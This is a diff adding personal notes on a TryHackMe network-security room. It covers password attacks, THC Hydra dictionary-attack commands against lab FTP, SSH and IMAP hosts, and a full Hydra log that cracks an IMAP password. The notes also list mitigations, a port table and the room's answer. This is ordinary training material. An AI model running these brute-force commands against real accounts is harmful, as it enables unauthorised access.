@@ -242,3 +242,247 @@ This task will focus on attacks against passwords, i.e. something the target kno
 123456
 123456789
 password
+adobe123
+12345678
+qwerty
+1234567
+111111
+photoshop
+123123
+Only two passwords are related to Adobe and its products, but the rest are generic. You might think that this has changed over the past decade; however, 123456, 1234567, 12345678, and 123456789 are still common choices for many users. Others haven’t realized yet that qwerty is not secret, and it is used by many as their password.
+Attacks against passwords are usually carried out by:
+Password Guessing: Guessing a password requires some knowledge of the target, such as their pet’s name and birth year.
+Dictionary Attack: This approach expands on password guessing and attempts to include all valid words in a dictionary or a wordlist.
+Brute Force Attack: This attack is the most exhaustive and time-consuming where an attacker can go as far as trying all possible character combinations, which grows fast (exponential growth with the number of characters).
+Let’s focus on dictionary attacks. Over time, hackers have compiled list after list containing leaked passwords from data breaches. One example is RockYou’s list of breached passwords, which you can find on the AttackBox at /usr/share/wordlists/rockyou.txt. The choice of the word list should depend on your knowledge of the target. For instance, a French user might use a French word instead of an English one. Consequently, a French word list might be more promising.
+We want an automated way to try the common passwords or the entries from a word list; here comes [THC Hydra](https://github.com/vanhauser-thc/thc-hydra). Hydra supports many protocols, including FTP, POP3, IMAP, SMTP, SSH, and all methods related to HTTP. The general command-line syntax is: hydra -l username -P wordlist.txt server service where we specify the following options:
+-l username: -l should precede the username, i.e. the login name of the target.
+-P wordlist.txt: -P precedes the wordlist.txt file, which is a text file containing the list of passwords you want to try with the provided username.
+server is the hostname or IP address of the target server.
+service indicates the service which you are trying to launch the dictionary attack.
+Consider the following concrete examples:
+hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.30.103 ftp will use mark as the username as it iterates over the provided passwords against the FTP server.
+hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.30.103 is identical to the previous example. 10.10.30.103 ftp is the same as ftp://10.10.30.103.
+hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.30.103 ssh will use frank as the user name as it tries to login via SSH using the different passwords.
+There are some extra optional arguments that you can add:
+-s PORT to specify a non-default port for the service in question.
+-V or -vV, for verbose, makes Hydra show the username and password combinations that are being tried. This verbosity is very convenient to see the progress, especially if you are still not confident of your command-line syntax.
+-t n where n is the number of parallel connections to the target. -t 16 will create 16 threads used to connect to the target.
+-d, for debugging, to get more detailed information about what’s going on. The debugging output can save you much frustration; for instance, if Hydra tries to connect to a closed port and timing out, -d will reveal this right away.
+Once the password is found, you can issue CTRL-C to end the process. In TryHackMe tasks, we expect any attack to finish within less than five minutes; however, the attack would usually take longer in real-life scenarios. Options for verbosity or debugging can be pretty helpful if you want Hydra to update you about its progress.
+In summary, attacks against login systems can be carried out efficiently using a tool, such as THC Hydra combined with a suitable word list. Mitigation against such attacks can be sophisticated and depends on the target system. A few of the approaches include:
+Password Policy: Enforces minimum complexity constraints on the passwords set by the user.
+Account Lockout: Locks the account after a certain number of failed attempts.
+Throttling Authentication Attempts: Delays the response to a login attempt. A couple of seconds of delay is tolerable for someone who knows the password, but they can severely hinder automated tools.
+Using CAPTCHA: Requires solving a question difficult for machines. It works well if the login page is via a graphical user interface (GUI). (Note that CAPTCHA stands for Completely Automated Public Turing test to tell Computers and Humans Apart.)
+Requiring the use of a public certificate for authentication. This approach works well with SSH, for instance.
+Two-Factor Authentication: Ask the user to provide a code available via other means, such as email, smartphone app or SMS.
+There are many other approaches that are more sophisticated or might require some established knowledge about the user, such as IP-based geolocation.
+Using a combination of the above approaches is an excellent approach to protect against password attacks.
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -t 16 -l lazie -P /usr/share/wordlists/rockyou.txt -vV 10.10.30.103 imap
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-31 12:56:45
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking imap://10.10.30.103:143/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[VERBOSE] CAPABILITY: * CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT
+1 OK CAPABILITY completed
+[VERBOSE] using IMAP CLEAR LOGIN mechanism
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "654321" - 17 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "michael" - 18 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "ashley" - 19 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "qwerty" - 20 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "111111" - 21 of 14344399 [child 8] (0/0)
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "iloveu" - 22 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "000000" - 23 of 14344399 [child 9] (0/0)
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "michelle" - 24 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "tigger" - 25 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "sunshine" - 26 of 14344399 [child 12] (0/0)
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ERROR] 2 NO Login failed.
+
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "chocolate" - 27 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "password1" - 28 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "soccer" - 29 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "anthony" - 30 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "friends" - 31 of 14344399 [child 15] (0/0)
+[ERROR] 2 NO Login failed.
+
+[ATTEMPT] target 10.10.30.103 - login "lazie" - pass "butterfly" - 32 of 14344399 [child 1] (0/0)
+[143][imap] host: 10.10.30.103   login: lazie   password: butterfly
+[STATUS] attack finished for 10.10.30.103 (waiting for children to complete tests)
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+[ERROR] 3 NO Login failed.
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-31 12:57:08
+```
+We learned that one of the email accounts is lazie. What is the password used to access the IMAP service on 10.10.30.103?
+*butterfly*
+### Summary
+This room covered various protocols, their usage, and how they work under the hood. Three common attacks are:
+Sniffing Attack
+MITM Attack
+Password Attack
+For each of the above, we focused both on the attack details and the mitigation steps.
+Many other attacks can be conducted against specific servers and protocols. We will provide a list of some related modules.
+Vulnerability Research: This module provides more information about vulnerabilities and exploits.
+Metasploit: This module trains you on how to use Metasploit to exploit target systems.
+Burp Suite: This module teaches you how to use Burp Suite to intercept HTTP traffic and launch attacks related to the web.
+It is good to remember the default port number for common protocols. For convenience, the services we covered are listed in the following table sorted by alphabetical order.
+Protocol 	TCP Port 	Application(s) 	Data Security
+FTP 	21 	File Transfer 	Cleartext
+FTPS 	990 	File Transfer 	Encrypted
+HTTP 	80 	Worldwide Web 	Cleartext
+HTTPS 	443 	Worldwide Web 	Encrypted
+IMAP 	143 	Email (MDA) 	Cleartext
+IMAPS 	993 	Email (MDA) 	Encrypted
+POP3 	110 	Email (MDA) 	Cleartext
+POP3S 	995 	Email (MDA) 	Encrypted
+SFTP 	22 	File Transfer 	Encrypted
+SSH 	22 	Remote Access and File Transfer 	Encrypted
+SMTP 	25 	Email (MTA) 	Cleartext
+SMTPS 	465 	Email (MTA) 	Encrypted
+Telnet 	23 	Remote Access 	Cleartext
+Hydra remains a very efficient tool that you can launch from the terminal to try the different passwords. We summarize its main options in the following table.
+Option 	Explanation
+-l username 	Provide the login name
+-P WordList.txt 	Specify the password list to use
+server service 	Set the server address and service to attack
+-s PORT 	Use in case of non-default service port number
+-V or -vV 	Show the username and password combinations being tried
+-d 	Display debugging output if the verbose output is not helping
+By now, you have completed the eighth room of the Network Security module. Please proceed to the [final room](https://tryhackme.com/room/netsecchallenge) of this module to test your skills.
+*No answer needed*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/992438a051d1355cf1146705557b457d.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/c1ec79277c1f02beeb20f7dc81df2fd3.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/3cb0c4f9dde184bf8dcd6b3a45418a44.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/9d265987c58331f6fd2f664837f85380.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/ea654470ae699d10e9c07bd11a8320ac.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2362c08e3a718863a1b1b56279931538.png)
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/fb2eb64abf54ed721dd55486d283b297.png)
+
+## Notes / Lessons Learned
+[[Protocols and Servers]]
+
